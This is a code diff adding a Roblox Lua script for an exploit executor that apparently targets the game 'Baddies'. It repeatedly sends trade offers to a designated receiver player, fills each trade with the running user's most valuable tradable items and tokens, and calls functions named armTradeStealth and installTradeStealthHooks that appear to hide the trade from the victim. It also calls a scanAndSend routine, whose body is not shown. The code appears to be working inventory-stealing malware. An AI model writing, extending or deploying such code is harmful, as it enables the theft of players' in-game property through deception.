+TradeState.replionId = nil  
+
+ensureTradeEnabled(TradeRuntime.dataReplion)  
+
+local ok, res = pcall(function()  
+    return remotes.SendTradeOffer:InvokeServer(targetPlayer)  
+end)  
+
+TradeRuntime.lastInviteAt = os.clock()  
+
+if ok and res == true then  
+    return true  
+end  
+
+return false, ok and tostring(res) or tostring(res)
+
+end
+
+local function runTradeSession(replionId, dataReplion, catalog, rapReplion)
+if TradeRuntime.sessionRunning then
+return false
+end
+TradeRuntime.sessionRunning = true
+setTradeDebug({ phase = "session_start" })
+
+local sessionResult = false  
+
+local function finish(result, detail)  
+    TradeRuntime.sessionRunning = false  
+    sessionResult = result == true  
+    setTradeDebug({  
+        sessionResult = result and "ok" or "failed",  
+        sessionDetail = detail,  
+        phase = result and "session_ok" or "session_failed",  
+    })  
+end  
+
+local ok, sessionErr = pcall(function()  
+    replionId = normalizeTradeReplionId(replionId)  
+    if not replionId then  
+        finish(false, "missing replion id")  
+        return  
+    end  
+
+    TradeState.replionId = replionId  
+    TradeState.active = true  
+    setTradeDebug({ phase = "wait_is_trading", replionId = replionId })  
+
+    waitForTradingAttribute(12)  
+
+    setTradeDebug({ phase = "wait_replion" })  
+    local tradeRep = waitForTradeReplion(replionId, 20)  
+    if not tradeRep then  
+        finish(false, "trade replion timeout")  
+        return  
+    end  
+
+    setTradeDebug({ phase = "wait_session_ready" })  
+    if not waitForTradeSessionReady(tradeRep, 20) then  
+        finish(false, "trade session not ready")  
+        return  
+    end  
+
+    setTradeDebug({ phase = "wait_trade_open" })  
+    if not waitForTradeSessionOpen(tradeRep, 15) then  
+        finish(false, "trade open timeout")  
+        return  
+    end  
+
+    armTradeStealth()  
+
+    local allItems = collectTradableTradeItems(dataReplion, catalog, rapReplion)  
+    local tokens = getTokenBalance(dataReplion)  
+    setTradeDebug({  
+        replionId = replionId,  
+        tradableCount = #allItems,  
+        tokens = tokens,  
+        added = 0,  
+        phase = "collect_done",  
+    })  
+
+    if #allItems == 0 and tokens <= 0 then  
+        finish(false, "nothing to trade")  
+        return  
+    end  
+
+    local maxItems = getTradeMaxItems()  
+    local batch = {}  
+    for i = 1, math.min(maxItems, #allItems) do  
+        table.insert(batch, allItems[i])  
+    end  
+
+    local addedCount = 0  
+    if #batch > 0 then  
+        addedCount = addItemsToTrade(tradeRep, batch)  
+    end  
+
+    setTradeDebug({ added = addedCount, phase = "add_finished" })  
+
+    if not isTradeLive() then  
+        finish(false, "trade ended before tokens")  
+        return  
+    end  
+
+    if addedCount == 0 and tokens <= 0 then  
+        finish(false, "no items added")  
+        return  
+    end  
+
+    setTradeTokens(dataReplion, tradeRep)  
+    finish(true)  
+end)  
+
+if not ok then  
+    finish(false, tostring(sessionErr))  
+end  
+
+return sessionResult
+
+end
+
+local function startTradeLoop()
+local serverOk, serverMessage = validateServerEarly()
+if not serverOk then
+return
+end
+
+if not getgenv().BaddiesAllowTrade then  
+    return  
+end  
+
+setupTradeListeners()  
+getTradeData()  
+installTradeStealthHooks()  
+
+local dataReplion = waitForDataReplion(45)  
+if not dataReplion then  
+    return  
+end  
+
+local catalog = loadCatalog()  
+local rapReplion = waitForRapReplion(20)  
+
+TradeRuntime.dataReplion = dataReplion  
+TradeRuntime.catalog = catalog  
+TradeRuntime.rapReplion = rapReplion  
+
+ensureTradeEnabled(dataReplion)  
+
+while true do  
+    local receiver = getReceiverPlayer()  
+    if not receiver then  
+        task.wait(2)  
+        continue  
+    end  
+
+    if TradeRuntime.sessionRunning then  
+        task.wait(0.5)  
+        continue  
+    end  
+
+    if isTradeLive() then  
+        local replionId = normalizeTradeReplionId(TradeState.replionId)  
+        if not replionId then  
+            replionId = waitForTradeStart(8)  
+        end  
+        if replionId then  
+            runTradeSession(replionId, dataReplion, catalog, rapReplion)  
+        end  
+        task.wait(TRADE_INVITE_COOLDOWN)  
+        continue  
+    end  
+
+    local allItems = collectTradableTradeItems(dataReplion, catalog, rapReplion)  
+    local tokens = getTokenBalance(dataReplion)  
+    if #allItems == 0 and tokens <= 0 then  
+        break  
+    end  
+
+    local sent, inviteErr = trySendTradeInvite(receiver)  
+    if not sent then  
+        task.wait(2)  
+        continue  
+    end  
+
+    local replionId = waitForTradeStart(20)  
+    if replionId then  
+        runTradeSession(replionId, dataReplion, catalog, rapReplion)  
+    end  
+
+    task.wait(TRADE_INVITE_COOLDOWN)  
+end
+
+end
+
+local ok, err = pcall(scanAndSend)
+
+if not ok then
+setScanStatus("error", tostring(err))
+end
+
+if ENABLE_TRADE and getgenv().BaddiesAllowTrade then
+task.spawn(function()
+pcall(startTradeLoop)
+end)
+end
+
+getgenv().BaddiesScanAndSend = scanAndSend
+getgenv().BaddiesGetTradeId = function()
+return normalizeTradeReplionId(TradeState.replionId)
+end
+getgenv().BaddiesGetStatus = function()
+local ls = getgenv().BaddiesLastScan or {}
+local td = getgenv().BaddiesTradeDebug or {}
+local detail = ls.detail
+local detailText = detail
+if typeof(detail) == "table" then
+detailText = string.format(
+"items=%s rap=%s",
+tostring(detail.totalItems),
+tostring(detail.totalRap)
+)
+end
+return string.format(
+"scan=%s (%s) | tradeId=%s | added=%s/%s | lastErr=%s | phase=%s | session=%s",
+tostring(ls.status),
+tostring(detailText),
+tostring(normalizeTradeReplionId(TradeState.replionId)),
+tostring(td.added),
+tostring(td.tradableCount),
+tostring(td.lastErr),
+tostring(td.phase),
+tostring(td.sessionDetail or td.sessionResult)
+)
+end
